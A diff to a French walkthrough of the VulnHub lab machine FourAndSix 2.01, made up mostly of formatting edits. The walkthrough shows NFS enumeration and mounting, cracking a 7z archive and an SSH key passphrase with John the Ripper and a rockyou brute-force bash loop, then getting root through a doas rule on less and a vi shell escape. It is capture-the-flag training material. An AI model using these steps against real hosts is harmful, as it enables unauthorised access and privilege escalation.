@@ -1,10 +1,10 @@
 # FourAndSix: 2.01
 
-[FourAndSix: 2.01](https://www.vulnhub.com/entry/fourandsix-201,266/) est une machine virtuelle vulnérable, conçue par Fred et publiée sur VulnHub au mois d'octobre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
+[FourAndSix: 2.01](https://www.vulnhub.com/entry/fourandsix-201,266/) est une machine virtuelle vulnérable, conçue par Fred Wemeijer et publiée sur VulnHub au mois d'octobre 2018. L'objectif, comme toujours, est de trouver et d'exploiter des vulnérabilités sur la VM fournie, afin d'obtenir les privilèges d'administration (root) et de récupérer un flag, preuve de l'intrusion et synonyme de validation du challenge. C'est parti pour ce _walkthrough_ ! Attention, spoilers...
 
 ## Recherche d'informations
 
-Pour commencer, l'outil netdiscover est utilisé afin de retrouver l'adresse IP de la VM FourAndSix : il s'agit de 192.168.56.101.
+Pour commencer, l'outil [__netdiscover__](https://github.com/alexxy/netdiscover) est utilisé afin de retrouver l'adresse IP de la VM FourAndSix : il s'agit de 192.168.56.101.
 
 ```console
 root@blinils:~# netdiscover -r 192.168.56.0/24
@@ -19,7 +19,7 @@ _____________________________________________________________________________
 192.168.56.101  08:00:27:41:81:5a      1      60  PCS Systemtechnik GmbH
 ```
 
-Toute phase d'attaque commence par une analyse du système cible. Un scan nmap va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de service Web cette fois-ci ! Il est néanmoins possible de se connecter à distance avec SSH (port 22) au serveur FourAndSix, et un [partage de fichiers en NFS](https://en.wikipedia.org/wiki/Network_File_System) est accessible sur le port 2049.
+Toute phase d'attaque commence par une analyse du système cible. Un scan [__nmap__](https://nmap.org/book/man.html) va nous permettre à la fois d'identifier les services installés sur le serveur, et d'obtenir des informations sur le système d'exploitation. Pas de service Web cette fois-ci ! Il est néanmoins possible de se connecter à distance avec SSH (port 22) au serveur FourAndSix, et un [partage de fichiers en NFS](https://en.wikipedia.org/wiki/Network_File_System) est accessible sur le port 2049.
 
 ```console
 root@blinils:~# nmap -sT -sV -p- 192.168.56.101
@@ -36,7 +36,7 @@ D'après Wikipédia, _Network File System (ou NFS), littéralement système de f
 
 ## Cassage du mot de passe d'un fichier 7z
 
-La commande _[rpcinfo](https://linux.die.net/man/8/rpcinfo)_ affiche chaque service basé sur RPC, tandis que _[showmount](https://linux.die.net/man/8/showmount)_ affiche les informations de montage NFS.
+La commande [```rpcinfo```](https://linux.die.net/man/8/rpcinfo) affiche chaque service basé sur RPC, tandis que [```showmount```](https://linux.die.net/man/8/showmount) affiche les informations de montage NFS.
 
 ```console
 root@blinils:~# rpcinfo -p 192.168.56.101
@@ -57,7 +57,7 @@ Export list for 192.168.56.101:
 /home/user/storage (everyone)
 ```
 
-Une fois le dossier partagé /home/user/storage monté avec la commande _mount_, on y récupère un fichier nommé [backup.7z](backup.7z) !
+Une fois le dossier partagé ```/home/user/storage``` monté avec la commande ```mount```, on y récupère un fichier nommé ```backup.7z``` !
 
 ```console
 root@blinils:~# mkdir /mnt/fourandsix
@@ -90,14 +90,14 @@ ERROR: Data Error in encrypted file. Wrong password? : id_rsa.pub
 --snip--
 ```
 
-L'outil [Fcrackzip](https://korben.info/cracker-des-zip-rar-7z-et-pdf-sous-linux.html), qui a été si pratique sur certains CTF, n'est d'aucune aide ici. En revanche, il existe un script nommé [7z2john](https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py) qui permet de calculer le hash d'un fichier 7z, afin que [John The Ripper](https://www.openwall.com/john/) puisse le traiter. Malheureusement, l'erreur ```backup.7z : 7-Zip files without header encryption are *not* supported yet!``` à l'exécution du script Python m'a convaincu d'utiliser la version Perl, fournie dans la version la plus récente de John The Ripper [publiée sur Github](https://github.com/magnumripper/JohnTheRipper), la version dite "jumbo".
+L'outil [__Fcrackzip__](https://korben.info/cracker-des-zip-rar-7z-et-pdf-sous-linux.html), qui a été si pratique sur certains CTF Jeopardy, n'est d'aucune aide ici. En revanche, il existe un script nommé [__7z2john__](https://github.com/truongkma/ctf-tools/blob/master/John/run/7z2john.py) qui permet de calculer le hash d'un fichier 7z, afin que l'outil [__John The Ripper__](https://www.openwall.com/john/) puisse le traiter. Malheureusement, l'erreur _```backup.7z : 7-Zip files without header encryption are *not* supported yet!```_ à l'exécution du script Python m'a convaincu d'utiliser la version Perl, fournie dans la version la plus récente de John The Ripper [publiée sur Github](https://github.com/magnumripper/JohnTheRipper), la version dite "jumbo".
 
 ```console
 root@blinils:/mnt/fourandsix# locate 7z2john.pl
 /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl
 ```
 
-Cependant, deux autres messages d'erreur se sont présentés à leur tour lors de l'utilisation du script 7z2john.pl : ```"Can't locate Compress/Raw/Lzma.pm in @INC"``` et ```"you may need to install the Compress::Raw::Lzma module"``` mais ceux-ci ont disparu après l'installation du paquet _liblzma-dev_ et de l'exécution de la commande ```cpan Compress::Raw::Lzma```. Il n'y a pas beaucoup de documentation au sujet de ces erreurs, encore moins sur leur résolution, donc si ça peut aider quelqu'un un jour, je pose ça là.
+Cependant, deux autres messages d'erreur se sont présentés à leur tour lors de l'utilisation du script __7z2john.pl__ : _```"Can't locate Compress/Raw/Lzma.pm in @INC"```_ et _```"you may need to install the Compress::Raw::Lzma module"```_ mais ceux-ci ont disparu après l'installation du paquet _liblzma-dev_ et de l'exécution de la commande ```cpan Compress::Raw::Lzma```. Il n'y a pas beaucoup de documentation au sujet de ces erreurs, encore moins sur leur résolution, donc si ça peut aider quelqu'un un jour, je pose ça là.
 
 ```console
 root@blinils:~# /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl backup.7z > backup.john
@@ -110,12 +110,12 @@ Can't locate Compress/Raw/Lzma.pm in @INC (you may need to install the Compress:
 BEGIN failed--compilation aborted at 
 /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl line 6.
 
-root@blinils:/mnt/fourandsix# apt-get install -y liblzma-dev
+root@blinils:~# apt-get install -y liblzma-dev
 --snip--
 Unpacking liblzma-dev:amd64 (5.2.2-1.3) ...
 Setting up liblzma-dev:amd64 (5.2.2-1.3) ...
 
-root@blinils:/mnt/fourandsix# cpan Compress::Raw::Lzma
+root@blinils:~# cpan Compress::Raw::Lzma
 Loading internal logger. Log::Log4perl recommended for better logging
 Reading '/root/.cpan/Metadata'
   Database was generated on Fri, 30 Nov 2018 11:11:11 GMT
@@ -126,7 +126,7 @@ Appending installation info to /usr/local/lib/x86_64-linux-gnu/perl/5.28.0/perll
   /usr/bin/make install  -- OK
 ```
 
-Une fois ce problème résolu, et comme à l'accoutumée, John The Ripper (avec le dictionnaire [Rockyou](https://wiki.skullsecurity.org/Passwords)) ne fait qu'une bouchée du hash.
+Une fois ce problème résolu, et comme à l'accoutumée, John The Ripper (avec le dictionnaire [rockyou.txt](https://wiki.skullsecurity.org/Passwords)) ne fait qu'une bouchée du hash.
 
 ```console
 root@blinils:/mnt/fourandsix# /root/Public/JohnTheRipper-bleeding-jumbo/run/7z2john.pl backup.7z > backup.john
@@ -160,9 +160,9 @@ hello6.png  hello7.jpeg  hello8.jpeg  id_rsa      id_rsa.pub
 
 ## Cassage de la passphrase d'une clé privée SSH
 
-Les huit images JPG et PNG sont celles du personnage [Hello Kitty](https://fr.wikipedia.org/wiki/Hello_Kitty) et ont vraisemblablement été placées là en guise de fausses pistes : aucune trace de flag dans les métadonnées des images ([exiftool](http://www.sno.phy.queensu.ca/~phil/exiftool/)), aucun message caché dans les bits de poids faible des images ([StegSolve](http://www.caesum.com/handbook/stego.htm), [zsteg](https://github.com/zed-0xff/zsteg)), et rien dans les fichiers eux-mêmes ([strings](https://en.wikipedia.org/wiki/Strings_(Unix)), [grep](https://en.wikipedia.org/wiki/Grep)). Dommage ! Pas d'épreuve de [stéganographie](https://en.wikipedia.org/wiki/Steganography) ce coup-ci...
+Les huit images JPG et PNG sont celles du personnage [_Hello Kitty_](https://fr.wikipedia.org/wiki/Hello_Kitty) et ont vraisemblablement été placées là en guise de fausses pistes : aucune trace de flag dans les métadonnées des images ([__exiftool__](http://www.sno.phy.queensu.ca/~phil/exiftool/)), aucun message caché dans les bits de poids faible des images ([__StegSolve__](http://www.caesum.com/handbook/stego.htm), [__zsteg__](https://github.com/zed-0xff/zsteg)), et rien dans les fichiers eux-mêmes ([_strings_](https://en.wikipedia.org/wiki/Strings_(Unix)), [_grep_](https://en.wikipedia.org/wiki/Grep)). Dommage ! Pas d'épreuve de [stéganographie](https://en.wikipedia.org/wiki/Steganography) ce coup-ci...
 
-Les clés privée et publique SSH sont donc la piste la plus sérieuse, pour la suite de ce challenge boot2root. Il s'agit bel et bien d'une paire de clés SSH, car l'une comme l'autre produisent le même fingerprint.
+Les clés privée et publique SSH sont donc la piste la plus sérieuse, pour la suite de ce challenge boot2root. Il s'agit bel et bien d'une paire de clés SSH, car l'une comme l'autre produisent le même _fingerprint_.
 
 ```console
 root@blinils:~/folder_backup# head -n1 id_rsa
@@ -176,7 +176,7 @@ root@blinils:~/folder_backup# ssh-keygen -l -f id_rsa.pub
 2048 SHA256:BPl29YrxUBdBmLaG6K58UGlR0wruEBQE8vGOtrbXl8Y user@fourandsix2 (RSA)
 ```
 
-Puisque nous disposons de la clé privée SSH du compte _user_, nous pouvons nous connecter au serveur avec.
+Puisque nous disposons de la clé privée SSH du compte ```user```, nous pouvons nous connecter au serveur avec.
 
 ```console
 root@blinils:~/folder_backup# ssh -i id_rsa user@192.168.56.101
@@ -191,7 +191,7 @@ user@192.168.56.101's password:
 user@192.168.56.101: Permission denied (publickey,password,keyboard-interactive).
 ```
 
-Perdu ! La clé privée SSH est protégée par une passphrase, qu'il va falloir trouver sous peine de mettre prématurément un terme à ce boot2root. Par chance, John The Ripper possède une myriade de scripts, dont ssh2john.py qui va pouvoir calculer un hash à partir d'une clé SSH. Manque de chance là aussi, le format du hash généré semble ne pas convenir à John The Ripper, qui retourne de nombreux faux positifs.
+Perdu ! La clé privée SSH est protégée par une passphrase, qu'il va falloir trouver sous peine de mettre prématurément un terme à ce boot2root. Par chance, John The Ripper possède une myriade de scripts, dont __ssh2john.py__ qui va pouvoir calculer un hash à partir d'une clé SSH. Manque de chance là aussi, le format du hash généré semble ne pas convenir à John The Ripper, qui retourne de nombreux faux positifs.
 
 ```console
 root@blinils:~/folder_backup# locate ssh2john.py
@@ -215,20 +215,20 @@ doctor           (id_rsa)
 Session aborted
 ```
 
-J'ai alors envisagé d'utiliser _ssh-keygen_ et son option -y qui prend en entrée une clé privée OpenSSH et donne en sortie la clé publique associée (que l'on connaît d'ores et déjà). L'option -P, quant à elle, permet de fournir directement la passphrase en ligne de commande.
+J'ai alors envisagé d'utiliser ```ssh-keygen``` et son option ```-y``` qui prend en entrée une clé privée OpenSSH et donne en sortie la clé publique associée (que l'on connaît d'ores et déjà). L'option ```-P```, quant à elle, permet de fournir directement la passphrase en ligne de commande.
 
 ```console
 root@blinils:~/folder_backup# /usr/bin/ssh-keygen -y -f id_rsa -P TESTTEST
 Load key "id_rsa": incorrect passphrase supplied to decrypt private key
 ```
 
-Un script permettrait de tester différentes passphrases, jusqu'à trouver la bonne. Tous les messages d'erreur, à savoir celui ci-dessus, ne sont pas affichés car redirigés vers le pseudo-périphérique /dev/null ; or si la commande ssh-keygen renvoie un résultat ```if [[ $? = 0 ]];``` c'est qu'il s'agit de la clé publique et donc de la bonne passphrase.
+Un script permettrait de tester différentes passphrases, jusqu'à trouver la bonne. Tous les messages d'erreur, à savoir celui ci-dessus, ne sont pas affichés car redirigés vers le pseudo-périphérique ```/dev/null``` ; or si la commande ```ssh-keygen``` renvoie un résultat ```if [[ $? = 0 ]];``` c'est qu'il s'agit de la clé publique et donc de la bonne passphrase. Le tout se situe dans le script [```test_passphrase_ssh_key.sh```](test_passphrase_ssh_key.sh) fourni avec ce _walkthrough_.
 
 ```console
 root@blinils:~/folder_backup# cat test_passphrase_ssh_key.sh
 #!/bin/bash
  
-for WORD in `cat /media/sf_share/dicts/rockyou.txt`
+for WORD in `cat /usr/share/wordlists/rockyou.txt`
 do
 	/usr/bin/ssh-keygen -y -f id_rsa -P "$WORD" 2>/dev/null
 	if [[ $? = 0 ]]; then
@@ -277,7 +277,7 @@ OpenBSD fourandsix2.localdomain 6.4 GENERIC#349 amd64
 
 ## Élévation de privilèges avec doas
 
-Pas de ```sudo -l``` cette fois-ci pour connaître la configuration sudo pour l’utilisateur courant, le binaire n'est pas installé sur le système. Le script [LinEnum.sh](https://github.com/rebootuser/LinEnum) va permettre d'obtenir tout plein d'informations sur le serveur : version du noyau, fichiers sensibles ou en écriture pour tous, accès privilégiés, liste des jobs, mots de passe par défaut, la liste est loin d'être exhaustive...
+Pas de ```sudo -l``` cette fois-ci pour connaître la configuration sudo pour l’utilisateur courant, le binaire n'est pas installé sur le système. Le script [__LinEnum.sh__](https://github.com/rebootuser/LinEnum) va permettre d'obtenir tout plein d'informations sur le serveur : version du noyau, fichiers sensibles ou en écriture pour tous, accès privilégiés, liste des jobs, mots de passe par défaut, la liste est loin d'être exhaustive...
 
 Le contenu du script est copié-collé dans l'éditeur [vi](https://en.wikipedia.org/wiki/Vi), à défaut de pouvoir le transférer convenablement.
 
@@ -309,9 +309,9 @@ permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog
 permit nopass keepenv root as root
 ```
 
-La première ligne du fichier _doas.conf_ signifie que l'utilisateur _user_ peut  exécuter la commande ```doas /usr/bin/less /var/log/authlog``` en tant que root, et de visualiser le contenu du fichier _authlog_ dans l'éditeur vi.
+La première ligne du fichier ```doas.conf``` signifie que l'utilisateur ```user``` peut exécuter la commande ```doas /usr/bin/less /var/log/authlog``` en tant que root, et de visualiser le contenu du fichier ```authlog``` dans l'éditeur vi.
 
-Ça tombe bien ! L'article _[Escaping Restricted Linux Shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)_ posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que vi ou vim. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/ksh``` nous permet d'obtenir un shell root digne de ce nom !
+Ça tombe bien ! L'article [_Escaping Restricted Linux Shells_](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells) posté sur le site du SANS Institute par Doug Stilwell donne une astuce très précieuse : il est possible d'obtenir un shell à partir d'un éditeur de texte tel que vi ou vim. Ça tombe bien, vi est l'un des seuls binaires que l'on peut appeler sur notre shell restreint. Une fois à l'intérieur de l'éditeur, la commande ```:!/bin/ksh``` nous permet d'obtenir un shell root digne de ce nom !
 
 ```console
 fourandsix2$ id
@@ -343,7 +343,7 @@ uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 
 L'auteur du challenge nous donne même ses solutions pour les deux cassages de mots de passe.
 
 ```console
-fourandsix2# head -n 6 /root/flag.txt                                                                                         
+fourandsix2# head -n 6 /root/flag.txt
 Nice you hacked all the passwords!
 
 Not all tools worked well. But with some command magic...:
@@ -367,7 +367,6 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session aborted
 ```
 
-
 ## Conclusion
 
-Malgré les nombreux messages d'erreur obtenus en début de CTF, cette VM était très sympa à résoudre, ne serait-ce que pour avoir codé soi-même des mini-scripts pour venir à bout des challenges. Ceux-ci étaient variés, pas de Web pour une fois (!) et il est rare de pouvoir s'exercer sur des boot2root sous OpenBSD. Un grand merci à Fred pour avoir conçu cette VM !
+Malgré les nombreux messages d'erreur obtenus en début de CTF, cette VM était très sympa à résoudre, ne serait-ce que pour avoir codé soi-même des mini-scripts pour venir à bout des challenges. Ceux-ci étaient variés, pas de Web pour une fois (!) et il est rare de pouvoir s'exercer sur des boot2root sous OpenBSD. Un grand merci à Fred Wemeijer pour avoir conçu cette VM !
